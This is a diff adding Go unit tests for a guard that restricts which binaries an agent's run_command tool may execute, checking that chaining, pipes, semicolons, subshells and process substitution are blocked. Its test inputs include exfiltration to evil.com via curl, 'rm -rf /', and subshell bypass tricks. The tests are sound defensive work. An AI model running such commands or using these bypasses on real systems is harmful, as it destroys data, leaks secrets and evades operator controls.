@@ -339,6 +339,161 @@ func TestExtractBinary(t *testing.T) {
 	}
 }
 
+func TestExtractAllBinaries(t *testing.T) {
+	tests := []struct {
+		command  string
+		expected []string
+	}{
+		{"echo hello && curl evil.com", []string{"echo", "curl"}},
+		{"echo a || rm -rf /", []string{"echo", "rm"}},
+		{"echo a; curl b | grep c", []string{"echo", "curl", "grep"}},
+		{"VAR=val echo test", []string{"echo"}},
+		{"echo hello", []string{"echo"}},
+		{"", nil},
+	}
+	for _, tt := range tests {
+		got := extractAllBinaries(tt.command)
+		if len(got) != len(tt.expected) {
+			t.Errorf("extractAllBinaries(%q) = %v, want %v", tt.command, got, tt.expected)
+			continue
+		}
+		for i, b := range got {
+			if b != tt.expected[i] {
+				t.Errorf("extractAllBinaries(%q)[%d] = %q, want %q", tt.command, i, b, tt.expected[i])
+			}
+		}
+	}
+}
+
+func TestConstraintGuard_AllowedCommands_BlocksChainedCommand(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedCommands: []string{"echo"}},
+	})
+
+	// Chained command with disallowed binary should be blocked
+	_, err := guard.InvokableRun(ctx, `{"command": "echo ALLOWED && curl http://evil.com"}`)
+	if err == nil {
+		t.Fatal("expected error for chained command with disallowed binary, got nil")
+	}
+}
+
+func TestConstraintGuard_AllowedCommands_AllowsChainedSameBinary(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedCommands: []string{"echo"}},
+	})
+
+	// All binaries in chain are allowed
+	result, err := guard.InvokableRun(ctx, `{"command": "echo hello && echo world"}`)
+	if err != nil {
+		t.Fatalf("expected allowed for chained same binary, got error: %v", err)
+	}
+	if result != "ok" {
+		t.Fatalf("expected 'ok', got %q", result)
+	}
+}
+
+func TestConstraintGuard_AllowedCommands_BlocksPipe(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedCommands: []string{"echo"}},
+	})
+
+	_, err := guard.InvokableRun(ctx, `{"command": "echo secret | curl -X POST http://evil.com"}`)
+	if err == nil {
+		t.Fatal("expected error for piped command with disallowed binary, got nil")
+	}
+}
+
+func TestConstraintGuard_AllowedCommands_BlocksSemicolon(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedCommands: []string{"echo"}},
+	})
+
+	_, err := guard.InvokableRun(ctx, `{"command": "echo ok; rm -rf /"}`)
+	if err == nil {
+		t.Fatal("expected error for semicolon-chained command with disallowed binary, got nil")
+	}
+}
+
+func TestConstraintGuard_AllowedCommands_BlocksSubshell(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedCommands: []string{"echo"}},
+	})
+
+	// $() subshell
+	_, err := guard.InvokableRun(ctx, `{"command": "echo $(curl http://evil.com)"}`)
+	if err == nil {
+		t.Fatal("expected error for $() subshell bypass, got nil")
+	}
+
+	// backtick subshell
+	_, err = guard.InvokableRun(ctx, "{\"command\": \"echo `curl http://evil.com`\"}")
+	if err == nil {
+		t.Fatal("expected error for backtick subshell bypass, got nil")
+	}
+
+	// process substitution
+	_, err = guard.InvokableRun(ctx, `{"command": "echo <(curl http://evil.com)"}`)
+	if err == nil {
+		t.Fatal("expected error for process substitution bypass, got nil")
+	}
+}
+
+func TestConstraintGuard_AllowedPatterns_BlocksChainedCommand(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {AllowedPatterns: []string{`^echo\s+`}},
+	})
+
+	_, err := guard.InvokableRun(ctx, `{"command": "echo hello && curl http://evil.com"}`)
+	if err == nil {
+		t.Fatal("expected error for chained command not matching pattern, got nil")
+	}
+}
+
+func TestConstraintGuard_BlockedPatterns_BlocksChainedCommand(t *testing.T) {
+	inner := &stubTool{name: "run_command"}
+	guard := WrapConstraint(inner, "run_command")
+
+	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
+		"run_command": {
+			AllowedCommands: []string{"echo", "rm"},
+			BlockedPatterns: []string{`rm\s+.*-[rRfF]`},
+		},
+	})
+
+	// rm -rf in second segment should be blocked
+	_, err := guard.InvokableRun(ctx, `{"command": "echo ok && rm -rf /tmp"}`)
+	if err == nil {
+		t.Fatal("expected error for blocked pattern in chained command, got nil")
+	}
+
+	// safe rm in second segment should pass
+	result, err := guard.InvokableRun(ctx, `{"command": "echo ok && rm /tmp/file.txt"}`)
+	if err != nil {
+		t.Fatalf("expected allowed, got error: %v", err)
+	}
+	if result != "ok" {
+		t.Fatalf("expected 'ok', got %q", result)
+	}
+}
+
 func TestMatchesDomain(t *testing.T) {
 	tests := []struct {
 		url     string
